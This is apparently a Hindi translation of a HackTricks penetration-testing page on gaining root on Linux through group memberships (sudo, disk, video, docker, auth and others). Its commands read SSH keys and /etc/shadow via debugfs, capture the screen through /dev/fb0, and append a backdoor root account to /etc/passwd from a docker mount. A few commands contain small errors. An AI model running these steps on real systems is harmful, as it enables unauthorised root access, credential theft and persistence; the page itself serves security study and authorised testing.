# दिलचस्प समूह - लिनक्स प्राइवेस्क

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें और PR जमा करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

## सुडो/एडमिन समूह

### **PE - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या कुछ सॉफ़्टवेयर की आवश्यकता होने के कारण)** **/etc/sudoers** फ़ाइल में आप इनमें से कुछ पंक्तियाँ ढूंढ सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **सूडो या एडमिन समूह में शामिल होने वाले कोई भी उपयोगकर्ता सूडो के रूप में कुछ भी चला सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ यह चला सकते हैं**:
```
sudo su
```
### PE - तकनीक 2

सभी suid बाइनरी ढूंढ़ें और देखें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आपको पता चलता है कि बाइनरी **pkexec एक SUID बाइनरी है** और आप **sudo** या **admin** समूह में शामिल हैं, तो आप `pkexec` का उपयोग करके बाइनरी को सुडो के रूप में निष्पादित कर सकते हैं।
यह इसलिए है क्योंकि आमतौर पर ये समूह **polkit नीति** के भीतर होते हैं। यह नीति मूल रूप से पहचानती है कि कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे निम्नलिखित के साथ जांचें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आपको पता चलेगा कि कौन से समूहों को **pkexec** को निष्पादित करने की अनुमति है और **डिफ़ॉल्ट रूप से** कुछ लिनक्स डिस्ट्रो में समूह **sudo** और **admin** दिखाई देते हैं।

**रूट बनने के लिए आप निम्नलिखित को निष्पादित कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को निष्पादित करने का प्रयास करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए है कि आप GUI के बिना कनेक्ट नहीं हैं।** और इस मुद्दे का एक काम करने का तरीका यहां है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्र** की आवश्यकता होगी:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## व्हील समूह

कभी-कभी, **डिफ़ॉल्ट** रूप से **/etc/sudoers** फ़ाइल में आप इस लाइन को पाएंगे:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **व्हील समूह में शामिल होने वाले कोई भी उपयोगकर्ता sudo के रूप में कुछ भी निष्पादित कर सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप सिर्फ निम्नलिखित को निष्पादित कर सकते हैं**:
```
sudo su
```
## शैडो ग्रुप

**शैडो ग्रुप** के उपयोगकर्ता **/etc/shadow** फ़ाइल को **पढ़ सकते हैं**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## डिस्क समूह

यह विशेषाधिकार प्रायः **रूट पहुंच के समान** होता है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुंच सकते हैं।

फ़ाइलें: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फ़ाइलें लिख सकते हैं**। उदाहरण के लिए, `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप निम्नलिखित कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
यदि आप **रूट के स्वामित्व वाली फ़ाइलें लिखने** की कोशिश करें (जैसे `/etc/shadow` या `/etc/passwd`), तो आपको "**अनुमति निषेध**" त्रुटि मिलेगी।

## वीडियो समूह

`w` कमांड का उपयोग करके आप **सिस्टम पर कौन लॉग इन है** यह पता लगा सकते हैं और यह निम्नलिखित तरह का आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** यह दर्शाता है कि मशीन पर उपयोगकर्ता **yossi शारीरिक रूप से लॉग इन** हैं।

**वीडियो समूह** को स्क्रीन आउटपुट देखने की अनुमति होती है। मूल रूप से, आप स्क्रीन पर दिख रही छवि को रॉ डेटा में प्राप्त कर सकते हैं और स्क्रीन द्वारा उपयोग की जा रही रिज़ॉल्यूशन प्राप्त कर सकते हैं। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन की रिज़ॉल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर ढूंढ सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
उदाहरण के लिए, आपको गिम्प का उपयोग करके रॉ इमेज खोलने के लिए करना होगा, `screen.raw` फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **रॉ इमेज डेटा** का चयन करें:

![](<../../../.gitbook/assets/image (287) (1).png>)

फिर चौड़ाई और ऊचाई को स्क्रीन पर उपयोग किए जाने वाले को बदलें और विभिन्न इमेज प्रकारों की जांच करें (और उसे चुनें जो स्क्रीन को बेहतर दिखाता है):

![](<../../../.gitbook/assets/image (288).png>)

## रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप से **रूट समूह के सदस्य** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलें या कुछ **लाइब्रेरी** फ़ाइलें या **अन्य रोचक चीजें** में पहुंच हो सकती है जिनका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है...

**जांचें कि रूट सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## डॉकर समूह

आप एक इंस्टेंस के वॉल्यूम में होस्ट मशीन के रूट फ़ाइल सिस्टम को माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है तो वह तत्काल उस वॉल्यूम में एक `chroot` लोड करता है। इससे आपको मशीन पर रूट उपयोगकर्ता मिल जाता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
अंत में, यदि आपको पहले के किसी सुझाव पसंद नहीं आते हैं या किसी कारणवश वे काम नहीं कर रहे हैं (डॉकर एपीआई फ़ायरवॉल?) तो आप हमेशा कोशिश कर सकते हैं **एक विशेषाधिकारी वाले कंटेनर को चलाने और उससे बाहर निकलने की** जैसा यहां समझाया गया है:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

यदि आपके पास डॉकर सॉकेट पर लिखने की अनुमति है, तो [**इस पोस्ट को पढ़ें जिसमें डॉकर सॉकेट का दुरुपयोग करके विशेषाधिकारों को बढ़ावा देने के बारे में बताया गया है**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd समूह

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm समूह

आमतौर पर **`adm`** समूह के **सदस्य** को _/var/log/_ में स्थित लॉग फ़ाइलें पढ़ने की अनुमति होती है।\
इसलिए, यदि आप इस समूह के भीतर एक उपयोगकर्ता को हथिया लिया है, तो आपको निश्चित रूप से लॉगों की **जांच करनी चाहिए**।

## Auth समूह

OpenBSD के अंदर, यदि उपयोग किए जाते हैं तो **auth** समूह आमतौर पर _**/etc/skey**_ और _**/var/db/yubikey**_ फ़ोल्डर में लिख सकता है।\
इन अनुमतियों का उपयोग निम्नलिखित एक्सप्लॉइट के साथ **विशेषाधिकारों को बढ़ाने** के लिए किया जा सकता है: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की** सुविधा चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में।**

</details>
